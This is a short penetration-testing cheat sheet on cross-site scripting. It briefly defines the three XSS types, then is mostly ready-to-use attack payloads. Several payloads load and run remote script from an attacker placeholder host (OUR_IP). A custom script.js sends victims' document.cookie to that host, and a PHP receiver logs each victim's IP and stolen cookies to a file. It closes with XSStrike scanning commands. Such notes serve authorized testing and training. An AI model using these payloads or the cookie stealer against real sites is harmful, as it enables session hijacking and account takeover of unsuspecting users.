## XSS

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

- Stored (Persistent) XSS 	The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments)

- Reflected (Non-Persistent) XSS 	Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message)

- DOM-based XSS 	Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags)

### Payloads
```html
<script>alert(window.origin)</script>
<img src="" onerror=alert(window.origin)>

<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```
## Custom payload :
```html
<script src=http://OUR_IP/script.js></script>
```

Content of "script.js"
```js
new Image().src='http://OUR_IP/index.php?c='+document.cookie
```

Content of index.php
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

### XSS Discovery
```bash
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 
```
